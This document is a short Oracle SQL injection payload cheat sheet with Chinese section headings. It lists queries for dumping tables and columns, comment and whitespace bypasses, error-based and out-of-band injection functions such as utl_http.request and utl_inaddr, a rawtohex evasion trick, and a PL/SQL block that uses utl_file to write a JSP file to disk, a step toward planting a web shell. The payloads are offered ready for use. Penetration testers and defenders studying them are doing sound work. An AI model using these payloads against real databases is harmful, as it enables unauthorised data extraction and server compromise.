Oracle Payload
========================================

常见Payload
----------------------------------------
- dump
    - ``select * from v$tablespace;``
    - ``select * from user_tables;``
    - ``select column_name from user_tab_columns where table_name = 'table_name';``
    - ``select column_name, data_type from user_tab_columns where table_name = 'table_name';``
    - ``SELECT * FROM ALL_TABLES``
- Comment
    - ``--``
    - ``/**/``
- Space
    - ``0x00`` ``0x09`` ``0xa-0xd`` ``0x20``
- 报错
    - ``utl_inaddr.get_host_name``
    - ``ctxsys.drithsx.sn``
    - ``ctxsys.CTX_REPORT.TOKEN_TYPE``
    - ``XMLType``
    - ``dbms_xdb_version.checkin``
    - ``dbms_xdb_version.makeversioned``
    - ``dbms_xdb_version.uncheckout``
    - ``dbms_utility.sqlid_to_sqlhash``
    - ``ordsys.ord_dicom.getmappingxpath``
    - ``utl_inaddr.get_host_name``
    - ``utl_inaddr.get_host_address``
- OOB
    - ``utl_http.request``
    - ``utl_inaddr.get_host_address``
    - ``SYS.DBMS_LDAP.INIT``
    - ``HTTPURITYPE``
    - ``HTTP_URITYPE.GETCLOB``
- 绕过
    - ``rawtohex``

写文件
----------------------------------------
.. code-block:: sql

    create or replace directory TEST_DIR as '/path/to/dir';
    grant read, write on directory TEST_DIR to system;
    declare
       isto_file utl_file.file_type;
    begin
       isto_file := utl_file.fopen('TEST_DIR', 'test.jsp', 'W');
       utl_file.put_line(isto_file, '<% out.println("test"); %>');
       utl_file.fflush(isto_file);
       utl_file.fclose(isto_file);
    end;
